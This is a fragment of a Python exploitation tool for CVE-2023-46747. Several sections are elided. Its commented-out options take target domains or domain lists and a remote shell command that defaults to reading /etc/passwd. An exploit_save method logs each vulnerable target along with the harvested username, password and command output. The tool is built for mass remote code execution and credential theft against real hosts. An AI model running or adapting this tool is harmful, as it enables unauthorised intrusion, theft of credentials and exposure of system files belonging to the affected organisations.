...
class Cve_2023_46747Poc2:
    ...
    #     description=f"[{bold}{blue}DESCTIPTION{reset}]: {bold}{white}Exploitation and Detection tool for Cisco CVE-2023-46747")
    #
    # parser.add_argument("-d", "--domain",
    #                     help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Target domain for exploiting without protocol eg:(www.domain.com)",
    #                     type=str)
    #
    # parser.add_argument("-dL", "--domains-list",
    #                     help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Targets domain for exploiting without protocol eg:(www.domain.com)",
    #                     type=str)
    #
    # parser.add_argument("-cmd", "--command",
    #                     help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Exploitation Shell command for Remote Code Execution",
    #                     type=str, default="cat /etc/passwd")
    #
    # parser.add_argument("-o", '--output', help=f"[{bold}{blue}INFO{reset}]: {bold}{white}File name to save output",
    #                     type=str)
    #
    # parser.add_argument("-to", "--time-out",
    #                     help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Switiching timeout will requests till for your timeout and also for BURPSUITE",
    #                     type=int)
    #
    # parser.add_argument("-px", "--proxy",
    #                     help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Switiching proxy will send request to your configured proxy (eg: BURPSUITE)",
    #                     type=str)
    #
    # parser.add_argument("-v", "--verbose",
    #                     help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Switiching Verbose will shows offline targets",
    #                     action="store_true")
    #
    ...
    def exploit_save(self,url, response=None):
        try:
            ...
            f"{bold}{red}Vulneable Taget: {url} | Credentials: Username: {username} && Password: {password} | Exploited : [ {response} ]"
    ...
    def main(self,target):
        domain = target[0].strip("/ ")
        proxy = target[1]
        self.proxy = {"http":proxy,"https":proxy}
        self.ssl = target[2]
        self.header = target[3]
